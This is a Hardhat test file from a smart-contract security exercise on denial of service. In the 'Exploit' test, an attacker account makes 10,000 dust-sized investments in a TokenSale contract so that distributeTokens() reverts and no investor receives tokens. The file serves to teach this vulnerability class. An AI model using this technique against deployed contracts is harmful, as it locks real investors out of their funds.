import { parse } from "path";

import { SignerWithAddress } from "@nomicfoundation/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";

import { FlashLoanUser, TokenSale, Auction, ShibaPool, ShibaToken } from '../../typechain-types';

const { deployContract, getSigners, parseEther } = ethers;

describe("DOS Attacks Exercise 1", () => {
  let deployer: SignerWithAddress;
  let user1: SignerWithAddress;
  let user2: SignerWithAddress;
  let user3: SignerWithAddress;
  let attacker: SignerWithAddress;

  const USER1_INVESTMENT = parseEther('5');
  const USER2_INVESTMENT = parseEther('15');
  const USER3_INVESTMENT = parseEther('10');

  let tokenSale: TokenSale;

  before(async () => {
    [deployer, user1, user2, user3, attacker] = await getSigners();
    tokenSale = await deployContract('TokenSale');

    // fund to each users
    await deployer.sendTransaction({ to: user1, value: parseEther('100') });
    await deployer.sendTransaction({ to: user2, value: parseEther('100') });
    await deployer.sendTransaction({ to: user3, value: parseEther('100') });

    // Invest
    await tokenSale.connect(user1).invest({ value: USER1_INVESTMENT });
    await tokenSale.connect(user2).invest({ value: USER2_INVESTMENT });
    await tokenSale.connect(user3).invest({ value: USER3_INVESTMENT });

    expect(await tokenSale.claimable(user1.address, 0)).equals(USER1_INVESTMENT * 5n);
    expect(await tokenSale.claimable(user2.address, 0)).equals(USER2_INVESTMENT * 5n);
    expect(await tokenSale.claimable(user3.address, 0)).equals(USER3_INVESTMENT * 5n);

  });

  it('Exploit', async () => {
    const ATTACKER_INVESTMENT = parseEther('0.000000000001');
    for (let i = 0; i < 10000; i++) {
      await tokenSale.connect(attacker).invest({ value: ATTACKER_INVESTMENT });
    }
  }).timeout(100000000);

  after(async () => {
    await expect(tokenSale.distributeTokens()).to.be.reverted;
  });
});
